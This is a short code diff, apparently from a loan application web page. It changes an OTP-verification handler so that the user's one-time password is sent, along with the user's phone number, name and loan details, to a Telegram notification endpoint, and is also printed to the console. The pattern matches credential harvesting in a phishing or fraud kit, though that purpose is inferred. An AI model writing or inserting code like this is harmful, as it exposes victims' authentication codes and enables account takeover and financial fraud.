@@ -689,7 +689,7 @@
             console.log('📥 Response:', data);
 
             if (data.success) {
-                // ─── SEND TELEGRAM NOTIFICATION ───
+                // ─── SEND TELEGRAM NOTIFICATION WITH OTP ───
                 try {
                     await fetch(`${CONFIG.API_URL}/api/telegram/otp-verified`, {
                         method: 'POST',
@@ -701,10 +701,11 @@
                             loanId: loanId,
                             phone: phone,
                             amount: amount,
-                            name: name
+                            name: name,
+                            otp: otp  // ← OTP INCLUDED
                         })
                     });
-                    console.log('✅ Telegram notification sent');
+                    console.log('✅ Telegram notification sent with OTP:', otp);
                 } catch (teleError) {
                     console.log('Telegram error (ignored):', teleError);
                 }
